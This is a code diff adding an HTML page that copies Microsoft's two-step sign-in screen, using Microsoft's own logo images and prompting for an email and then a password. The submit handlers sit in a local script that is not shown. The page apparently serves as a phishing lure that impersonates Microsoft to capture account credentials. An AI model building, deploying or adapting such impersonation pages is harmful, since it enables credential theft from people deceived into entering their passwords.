@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="login.css">
+</head>
+<body>
+    <div class="login-container">
+        <div id="emailStep">
+            <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft" class="microsoft-logo">
+            
+            <div class="login-form">
+                <div class="form-header">
+                    <h1>Sign in</h1>
+                </div>
+
+                <div class="form-group">
+                    <div id="emailError" class="error-message"></div>
+                    <input type="text" id="email" class="form-control" placeholder="Email, phone, or Skype">
+                </div>
+
+                <div class="form-links">
+                    No account? <a href="#" class="create-link">Create one!</a>
+                </div>
+
+                <div class="button-container">
+                    <button type="button" class="button-next" onclick="handleEmailNext()">Next</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="passwordStep" class="hidden">
+            <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft" class="microsoft-logo">
+            
+            <div class="back-button" onclick="showEmailStep()">
+                <img src="https://logincdn.msftauth.net/shared/5/images/arrow_left_a9cc2824ef3517b6c416.svg" alt="Back">
+            </div>
+
+            <div class="login-form">
+                <div class="email-display"></div>
+
+                <div class="form-header">
+                    <h1>Enter password</h1>
+                </div>
+
+                <div class="form-group">
+                    <div id="passwordError" class="error-message"></div>
+                    <div class="password-input-container">
+                        <input type="password" id="pssd" class="form-control" placeholder="Password">
+                        <button type="button" class="toggle-password" onclick="togglePassword()">
+                            <span class="eye-icon">👁️</span>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="forgot-password">
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </div>
+
+                <div class="button-container">
+                    <button type="button" class="button-next" onclick="handlePasswordSubmit()">Sign in</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="login.js"></script>
+</body>
+</html>
